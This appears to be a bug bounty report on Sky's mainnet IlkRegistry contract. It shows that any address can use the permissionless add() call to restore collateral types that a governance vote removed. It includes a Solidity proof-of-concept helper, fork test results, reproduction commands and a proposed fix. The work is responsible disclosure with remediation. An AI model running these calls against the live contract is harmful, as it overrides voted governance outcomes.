# Permissionless IlkRegistry add lets any address repeatedly veto governance removal of offboarded ilks

## Severity

**Submitted severity:** Critical

**Selected in-scope impact:**

> Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Affected production contract

- Contract: `IlkRegistry`
- Address: `0x5a464C28D19848f44199D003BeF5ecc87d090F87`
- Network: Ethereum mainnet
- Source: `sky-ecosystem/ilk-registry/src/IlkRegistry.sol`

All state-changing tests were performed only on local mainnet forks.

## Summary

The August 7, 2025 executive proposal stated that 42 listed offboarded ilks would be removed from IlkRegistry to finalize their offboarding.

The production Registry cannot preserve that approved postcondition. `removeAuth(ilk)` deletes the record but stores no terminal lifecycle state. Because the old Join adapters remain live and Vat-authorized, any address can immediately call permissionless `add(adapter)` and recreate the removed record.

This is not a one-time historical edge case:

- one unprivileged call can execute the real approved spell and restore 31 removed records before the same transaction returns;
- the same 31 records remain permissionlessly restorable at pinned current block `25,694,337`;
- public `remove()` cannot remove them after restoration because the Joins remain live; and
- even repeated governance `removeAuth()` actions can be followed by another public re-add, allowing an arbitrary address to choose the final Registry and OmegaPoker target-set state.

The report does **not** claim theft, debt reopening, insolvency, liquidation, fund freezing, unique `MCD_VAT` modification, or Chainlog inconsistency.

## Root cause

IlkRegistry supports two semantically different operations using the same state:

```text
Temporary technical refresh:
registered -> removeAuth -> absent temporarily -> public add -> registered

Governance terminal removal:
registered -> removeAuth -> expected to remain absent
```

In both cases, the actual contract state after `removeAuth` is only:

```text
ilkData[ilk].join == address(0)
```

`add(address)` checks technical adapter/module state but no governance lifecycle state:

- Join points to production Vat;
- Join remains a Vat ward;
- the symbolic ilk is absent from Registry;
- residual Spotter oracle configuration exists; and
- residual Dog/Cat liquidation configuration exists.

There is no tombstone, blocked flag, terminal-removal nonce, or equivalent invariant.

Official tests demonstrate that `removeAuth -> add` is an intended temporary refresh workflow. The issue is that terminal governance removal is indistinguishable from that temporary workflow.

## Governance baseline

Official proposal: August 7, 2025 executive vote.

The proposal stated that the listed offboarded vault types would be removed from IlkRegistry **to finalize their offboarding**.

Real deployed spell:

```text
0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5
```

Pinned fork block:

```text
23,118,263
```

This is one block before the real cast.

Clean execution:

```text
pre-cast Registry count   72
post-cast Registry count  30
removed records           42
spell.done()               true
```

## PoC 1 — atomic reversal of the real approved cleanup

Test:

```text
src/IlkRegistryAtomicGovernanceReversal.t.sol
```

An unprivileged helper calls the public executable spell and then public Registry additions:

```solidity
function castAndRestore(
    address spell,
    address registry,
    address[] calldata adapters
) external returns (uint256 restored) {
    DssSpellLike(spell).cast();

    for (uint256 i = 0; i < adapters.length; i++) {
        (bool ok,) = registry.call(
            abi.encodeWithSignature("add(address)", adapters[i])
        );
        if (ok) restored++;
    }
}
```

Machine result:

```text
[PASS] testOneUnprivilegedTransactionCastsSpellAndReversesCleanup()
spell done true
restored atomically 31
final Registry count 61
atomic call gas used 9,535,907
block gas limit 44,868,168
```

Expected approved postcondition:

```text
72 -> 30
```

Actual final state selected by the public caller:

```text
72 -> real spell -> 30 -> public add -> 61
```

No privileged key, malicious proposal, vote manipulation, miner cooperation, or probabilistic front-running is required.

## PoC 2 — repeated public veto of governance removal

Test:

```text
src/IlkRegistryGovernanceRemovalVeto.t.sol
```

At pinned current block `25,694,337`, the test alternates legitimate governance removal with arbitrary public re-addition for `AAVE-A`:

```text
governance removeAuth(AAVE-A)
-> Registry and OmegaPoker no longer contain AAVE-A
-> arbitrary caller add(AAVE_JOIN)
-> Registry and OmegaPoker contain AAVE-A again
```

This cycle is repeated three times, followed by a fourth public re-add.

Machine result:

```text
[PASS] testPublicCallerCanVetoRepeatedGovernanceRemovalCycles()
governance removeAuth cycles 3
successful unprivileged re-adds 4
final AAVE-A present in Registry true
final AAVE-A present in Omega true
total attacker add gas 758,204
AAVE Join remains live 1
AAVE Join remains Vat ward 1
```

This proves that `removeAuth` cannot establish or maintain the voted absence postcondition. After every cleanup-only governance action, an arbitrary address can cheaply restore the target and choose the final state.

## PoC 3 — current mass restoration

Test:

```text
src/IlkRegistryCurrentMassReAdd.t.sol
```

Pinned block:

```text
25,694,337
```

Results:

```text
initial Registry count 35
successful additions    31 / 31
final Registry count    66
```

For every adapter, the test independently asserts:

- expected symbolic ilk;
- production Vat;
- `Join.live() == 1`;
- `Vat.wards(join) == 1`;
- absence before `add()`;
- successful production `add()`;
- presence in `list()` afterward; and
- non-zero Registry oracle/liquidation metadata.

All 31 positively restored ilks have `Art == 0` and `line == 0`.

`RWA012-A` and `RWA013-A` have residual Art, but both additions revert with `IlkRegistry/invalid-auction-contract`; they are excluded from the claim.

## Persistence and why the public caller wins

### Public removal is blocked

After restoration, public `remove(ilk)` requires a caged Join. All 31 restored Joins remain live, so ordinary users cannot return the Registry to the approved removed state.

Machine result:

```text
restored entries 31
public removals blocked by live joins 31
```

### Caging alone is not terminal

`add()` does not check `Join.live()`. A caged adapter can still follow:

```text
add -> public remove -> add
```

### Denying the Join breaks collateral exit

`Vat.deny(join)` prevents Registry re-addition, but the same Vat authorization is required by `GemJoin.exit()` through `Vat.slip`.

A fork test proves `exit()` reverts with `Vat/not-authorized` after deny. At the pinned block, the AAVE Join held approximately `77.033778046632910564 AAVE`.

This does not mean governance has no possible workaround. Governance can clear residual module pointers or deploy a Registry lifecycle fix. It means the existing voted `removeAuth` operation is not terminal and cannot maintain its own postcondition.

## Unique downstream consequence

The unique consequence of Registry re-addition is restoration of canonical list membership consumed by contracts such as OmegaPoker and deployed multi-emergency spells.

A focused negative control proves that `MCD_VAT.spot` is **not** a unique consequence: a public caller can directly execute the residual legacy oracle `poke()` followed by public `MCD_SPOT.poke(ilk)` and obtain the same final value without Registry re-addition.

For `LINK-A`:

```text
baseline Vat.spot                     72,000,000,000,000,000,000,000,000
direct oracle + Spotter result       145,650,900,000,000,000,000,000,000
Registry + OmegaPoker result         145,650,900,000,000,000,000,000,000
final values equal                   true
```

Therefore this report does not use `MCD_VAT`, oracle updates, or Chainlog inconsistency as its severity driver.

## Secondary emergency-response evidence

Re-added records alter the dynamic target set and `done()` result of deployed `MultiOsmStopSpell` and `MultiClipBreakerSpell`.

Measured results include 25 and 30 newly pending legacy obligations and repeatable staged re-executions. These are presented only as evidence that Registry membership is consumed operationally. No fund freeze, permanent DoS, active-auction exposure, or independent listed impact is claimed.

## Impact mapping

The exact voted postcondition was removal of named records from IlkRegistry to finalize offboarding. The attacker can:

1. execute the real approved spell;
2. reverse 31 of the 42 removals before the same transaction returns;
3. keep the spell marked executed;
4. repeat the reversal after every later cleanup-only `removeAuth`; and
5. force the final canonical Registry/Omega target-set state to differ from the approved result.

This is the basis for selecting:

> Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

The report does not argue that public Registry mutation is always forbidden. It argues that governance used an operation publicly described as terminal, but the deployed state machine gives any address a repeatable veto over that exact postcondition.

## Important counterevidence

Sky's current program rules state that grouping governance and permissionless actions is assumed to be implemented at the spell or `dss-exec-lib` layer. This is the strongest scope objection: triage may classify the issue as incomplete spell composition rather than a rewarded Registry vulnerability.

The technical response is that no terminal state exists in the deployed Registry, and the repeated-veto PoC proves the problem persists independently of the historical spell. Nevertheless, impact classification depends on Sky's interpretation of its governance-impact wording.

## Explicit non-claims

This report does not claim:

- theft;
- insolvency;
- debt reopening;
- liquidation;
- active-auction loss;
- fund freezing;
- unique `MCD_VAT.spot` modification;
- Chainlog inconsistency as an impact;
- residual AutoLine reactivation;
- keeper payment extraction;
- block-gas denial of service; or
- malicious governance code.

## Recommended remediation

Add a governance-controlled terminal lifecycle state:

```solidity
mapping(bytes32 => bool) public blocked;

function blockIlk(bytes32 ilk) external auth {
    blocked[ilk] = true;
    if (ilkData[ilk].join != address(0)) _remove(ilk);
}

function unblockIlk(bytes32 ilk) external auth {
    blocked[ilk] = false;
}

function add(address adapter) external {
    bytes32 ilk = JoinLike(adapter).ilk();
    require(!blocked[ilk], "IlkRegistry/ilk-blocked");
    // Existing validation.
}
```

Terminal offboarding spells should call `blockIlk`; temporary metadata refreshes may continue using `removeAuth -> add` while the tombstone remains unset.

Alternatively, an offboarding spell can explicitly clear the residual Spotter/Dog conditions that make the old adapter addable, provided that doing so is compatible with the intended collateral-exit lifecycle.

## Reproduction

```bash
export ETH_RPC_URL='<ARCHIVE_ETHEREUM_RPC>'
forge build

forge test --threads 1 \
  --match-path src/IlkRegistryAtomicGovernanceReversal.t.sol \
  --match-test testOneUnprivilegedTransactionCastsSpellAndReversesCleanup \
  -vvvv

forge test --threads 1 \
  --match-path src/IlkRegistryGovernanceRemovalVeto.t.sol \
  --match-test testPublicCallerCanVetoRepeatedGovernanceRemovalCycles \
  -vvvv

forge test --threads 1 \
  --match-path src/IlkRegistryCurrentMassReAdd.t.sol \
  -vvvv

forge test --threads 1 \
  --match-path src/IlkRegistryPersistence.t.sol \
  -vvvv

forge test --threads 1 \
  --match-path src/IlkRegistryDirectSpotterSingleControl.t.sol \
  --match-test testDirectPublicOracleAndSpotterPathMatchesRegistryOmegaResult \
  -vvvv
```
